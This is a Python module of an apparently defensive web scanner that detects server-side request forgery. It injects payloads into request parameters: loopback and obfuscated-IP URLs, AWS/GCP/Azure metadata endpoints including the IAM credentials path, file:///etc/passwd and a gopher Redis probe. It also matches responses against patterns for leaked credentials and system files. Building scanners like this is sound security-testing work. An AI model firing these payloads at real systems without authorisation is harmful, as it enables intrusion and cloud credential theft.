"""
mod_ssrf.py — Server-Side Request Forgery detection module.

Covers:
  • Internal service probing (localhost, 127.0.0.1, 169.254.x.x)
  • Cloud metadata endpoints (AWS, GCP, Azure)
  • Response-based detection (content from internal services)
  • Error-based detection (connection refused → server tried to connect)
"""

import re
import logging
from typing import Any, Dict, List
from urllib.parse import urlparse

from my_scan.modules.base import BaseModule, CRITICAL, HIGH, MEDIUM

logger = logging.getLogger("mod_ssrf")

# ── Payloads ─────────────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    # Loopback / internal
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://localhost/",
    "http://localhost:8080/",
    "http://0.0.0.0/",
    # IPv6 loopback
    "http://[::1]/",
    "http://[::]:80/",
    # Decimal / octal IP obfuscation
    "http://2130706433/",          # 127.0.0.1 in decimal
    "http://0177.0.0.1/",          # octal
    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",              # AWS
    "http://169.254.169.254/latest/meta-data/iam/",          # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/",   # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    # DNS rebinding / common internal services
    "http://internal/",
    "http://prod/",
    "http://staging/",
    "http://admin/",
    # File schema (SSRF-as-LFI)
    "file:///etc/passwd",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    # dict / gopher / ftp
    "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:6379/_INFO",
]

# ── Detection patterns ────────────────────────────────────────────────────────

# Content from AWS metadata
AWS_PATTERNS = [
    re.compile(r"ami-id", re.IGNORECASE),
    re.compile(r"instance-id", re.IGNORECASE),
    re.compile(r"iam/security-credentials", re.IGNORECASE),
    re.compile(r'"AccessKeyId"\s*:', re.IGNORECASE),
]

# Content from GCP metadata
GCP_PATTERNS = [
    re.compile(r'"kind"\s*:\s*"compute#', re.IGNORECASE),
    re.compile(r"computeMetadata", re.IGNORECASE),
]

# Generic internal service leakage
INTERNAL_PATTERNS = [
    re.compile(r"root:x:0:0:", re.IGNORECASE),                        # /etc/passwd
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),           # /etc/hosts
    re.compile(r"<title>.*?(admin|dashboard|internal).*?</title>", re.IGNORECASE),
    re.compile(r"redis_version", re.IGNORECASE),                       # Redis INFO
    re.compile(r"memcached", re.IGNORECASE),
    re.compile(r"mysql_native_password", re.IGNORECASE),
]

# Connection errors that hint server *tried* to connect (error-based SSRF)
ERROR_HINTS = [
    "connection refused",
    "failed to connect",
    "network is unreachable",
    "no route to host",
    "connection timed out",
    "could not resolve host",
    "ECONNREFUSED",
    "ETIMEDOUT",
]


class SSRFModule(BaseModule):
    name        = "ssrf"
    description = "Detects Server-Side Request Forgery (SSRF) via internal probing and metadata endpoints"

    async def run(self, entrypoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        params = self._all_params(entrypoint)

        if not params:
            return findings

        for param_name in params:
            for payload in SSRF_PAYLOADS:
                ep   = self._inject_param(entrypoint, param_name, payload)
                resp = await self._send(ep, allow_redirects=False)
                if resp is None:
                    continue
                try:
                    body   = await resp.text()
                    status = resp.status
                    headers = dict(resp.headers)
                finally:
                    resp.release()

                body_lower = body.lower()

                # AWS metadata leakage
                if any(p.search(body) for p in AWS_PATTERNS):
                    findings.append(self._make_finding(
                        vulnerability="SSRF — AWS Metadata Exposure",
                        vuln_id="ssrf",
                        severity=CRITICAL,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="AWS EC2 metadata content detected in response",
                    ))
                    break

                # GCP metadata leakage
                if any(p.search(body) for p in GCP_PATTERNS):
                    findings.append(self._make_finding(
                        vulnerability="SSRF — GCP Metadata Exposure",
                        vuln_id="ssrf",
                        severity=CRITICAL,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="GCP compute metadata content detected in response",
                    ))
                    break

                # Internal service leakage
                matched = next((p for p in INTERNAL_PATTERNS if p.search(body)), None)
                if matched:
                    findings.append(self._make_finding(
                        vulnerability="SSRF — Internal Service Response Leaked",
                        vuln_id="ssrf",
                        severity=HIGH,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Internal content pattern matched: '{matched.pattern[:60]}'",
                    ))
                    break

                # Error-based SSRF (server attempted connection and error leaked)
                if any(hint in body_lower for hint in ERROR_HINTS):
                    findings.append(self._make_finding(
                        vulnerability="SSRF — Error-based (Server Attempted Outbound Connection)",
                        vuln_id="ssrf",
                        severity=MEDIUM,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="Connection error from server suggests it attempted to fetch the URL",
                    ))
                    break

        return findings

    # ------------------------------------------------------------------
    def _all_params(self, ep: Dict[str, Any]) -> List[str]:
        names: List[str] = []
        if ep.get("params"):
            names += list(ep["params"].keys())
        body = ep.get("body", "") or ""
        if body:
            import json as _j
            from urllib.parse import parse_qs as _pqs
            try:
                bd = _j.loads(body)
                if isinstance(bd, dict):
                    names += [k for k in bd if k not in names]
            except Exception:
                pass
            try:
                for k in _pqs(body):
                    if k not in names:
                        names.append(k)
            except Exception:
                pass
        return names
